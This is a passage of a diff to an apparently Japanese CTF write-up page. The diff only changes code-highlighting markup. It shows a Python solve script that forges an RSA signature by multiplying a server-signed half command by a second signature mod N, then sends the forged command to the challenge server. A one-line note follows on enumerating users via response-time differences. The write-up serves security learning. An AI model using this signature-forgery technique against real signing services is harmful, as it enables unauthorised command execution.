+<span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">))</span>
 
-s<span style="color:#f92672">.</span>sendall(
-    half_command<span style="color:#f92672">.</span>to_bytes((half_command<span style="color:#f92672">.</span>bit_length() <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span>) , byteorder<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>, signed<span style="color:#f92672">=</span>False) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
-)
+<span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span>
+    <span class="n">half_command</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">((</span><span class="n">half_command</span><span class="o">.</span><span class="n">bit_length</span><span class="p">()</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span> <span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s1">&#39;big&#39;</span><span class="p">,</span> <span class="n">signed</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
+<span class="p">)</span>
 
-signature_half_command <span style="color:#f92672">=</span> int(
-    re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#39;Signature: ([\da-f]+)&#39;</span>, s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>),
-    <span style="color:#ae81ff">16</span>
-)
+<span class="n">signature_half_command</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span>
+    <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;Signature: ([\da-f]+)&#39;</span><span class="p">,</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">))</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>
+    <span class="mi">16</span>
+<span class="p">)</span>
 
-<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;signature half command: &#34;</span> <span style="color:#f92672">+</span> str(signature_half_command))
+<span class="k">print</span><span class="p">(</span><span class="s2">&#34;signature half command: &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">signature_half_command</span><span class="p">))</span>
 
-<span style="color:#75715e"># Calculate signature</span>
-signature_command <span style="color:#f92672">=</span> signature_half_command <span style="color:#f92672">*</span> signature_2 <span style="color:#f92672">%</span> N
+<span class="c1"># Calculate signature</span>
+<span class="n">signature_command</span> <span class="o">=</span> <span class="n">signature_half_command</span> <span class="o">*</span> <span class="n">signature_2</span> <span class="o">%</span> <span class="n">N</span>
 
-<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;GOOOOOOOOOOOOOOOOOO&#34;</span>)
+<span class="k">print</span><span class="p">(</span><span class="s2">&#34;GOOOOOOOOOOOOOOOOOO&#34;</span><span class="p">)</span>
 
-<span style="color:#75715e"># Execute command</span>
-s<span style="color:#f92672">.</span>sendall(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
-<span style="color:#66d9ef">print</span>(s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
-s<span style="color:#f92672">.</span>sendall(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1337,F</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
-<span style="color:#66d9ef">print</span>(s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
-sig <span style="color:#f92672">=</span> (format(signature_command, <span style="color:#e6db74">&#39;x&#39;</span>))<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;ascii&#34;</span>)
+<span class="c1"># Execute command</span>
+<span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;2</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">))</span>
+<span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1337,F</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">))</span>
+<span class="n">sig</span> <span class="o">=</span> <span class="p">(</span><span class="n">format</span><span class="p">(</span><span class="n">signature_command</span><span class="p">,</span> <span class="s1">&#39;x&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;ascii&#34;</span><span class="p">)</span>
 
-s<span style="color:#f92672">.</span>sendall(sig <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#39;</span>)
+<span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">sig</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n\n</span><span class="s1">&#39;</span><span class="p">)</span>
 
-<span style="color:#66d9ef">print</span>(s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">2024</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
-</code></pre></div><h2 id="web">Web</h2>
+<span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2024</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">))</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="web">Web</h2>
 <h3 id="spy">Spy</h3>
 <p>ユーザの有無でサーバの応答時間が変わるので、全ユーザー試して列挙。</p>
 <h3 id="tweetstore">Tweetstore</h3>
